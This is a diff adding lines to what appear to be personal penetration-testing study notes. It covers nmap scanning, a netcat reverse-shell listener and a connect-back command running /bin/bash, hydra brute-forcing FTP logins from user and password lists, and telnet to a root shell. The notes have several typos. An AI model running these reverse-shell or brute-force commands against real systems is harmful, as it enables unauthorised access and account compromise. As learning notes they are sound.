@@ -18,3 +18,31 @@ scrvice version> nmap -p- -sV 127.0.0.1
 script> nmap -p- -sV -sC 127.0.0.1
 save output> > -o text.txt
 command binding> -sV + -sC = -sVC
+
+]
+ >reverse shell
+
+ 
+nc -lvnp <port 9001>
+python <script> <ip> nc <own ip> <port> -e /bin/bash
+
+
+>hydra
+
+-l username
+-L list
+-p password
+-P list
+
+
+hydera -L user.txt -P pass.txt ftp://<ip:port>
+
+
+-v verbos is used to show background work
+
+
+telnet <ip> <port of root shell >
+
+
+>metesploit
+
